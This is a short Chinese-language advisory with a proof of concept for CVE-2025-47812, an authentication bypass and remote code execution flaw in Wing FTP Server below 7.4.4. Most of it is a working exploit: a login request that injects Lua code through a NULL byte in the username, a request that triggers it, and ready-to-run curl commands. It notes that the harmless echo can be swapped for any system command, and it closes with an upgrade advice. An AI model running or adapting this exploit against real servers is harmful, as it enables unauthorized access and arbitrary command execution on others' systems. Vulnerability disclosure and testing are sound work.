### 漏洞描述

攻击者可通过在用户名中注入NULL字节绕过身份验证。无需有效凭证，攻击者仅需附加NULL字节，即可通过身份验证并获取有效会话，进而执行任意代码

### 影响版本

Wing FTP Server < 7.4.4

### 漏洞状态

已确认

### POC利用流程

#### 第一步

利用阶段：注入恶意 Lua 代码到 session 文件

说明：

username 参数中利用了 NULL 字节（%00）和 Lua 代码注入。

cmd 可替换为任意系统命令。

```yaml
POST /loginok.html HTTP/1.1
Host: xxx.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 164

username=anonymous%00]]%0dlocal+h+%3d+io.popen("echo CVE-2025-47812")%0dlocal+r+%3d+h%3aread("*a")%0dh%3aclose()%0dprint(r)%0d--&password=
```

#### 第二步

访问 session 文件，触发命令执行

```yaml
GET /dir.html HTTP/1.1
Host: xxxxiaoai.com
```

如果漏洞存在，/dir.html 的响应体中会包含 CVE-2025-47812 字样

### curl POC 示例

```yaml
curl -i -s -k -X $'POST' \
    -H $'Host: <目标IP或域名>' \
    -H $'Content-Type: application/x-www-form-urlencoded' \
    --data-binary $'username=anonymous%00]]\rlocal h = io.popen("echo CVE-2025-47812")\rlocal r = h:read("*a")\rh:close()\rprint(r)\r--&password=' \
    'http://<目标IP或域名>/loginok.html'

curl -i -s -k -X $'GET' \
    -H $'Host: <目标IP或域名>' \
    'http://<目标IP或域名>/dir.html'
```

### 修复建议

立即升级至 Wing FTP Server 7.4.4 或更高版本。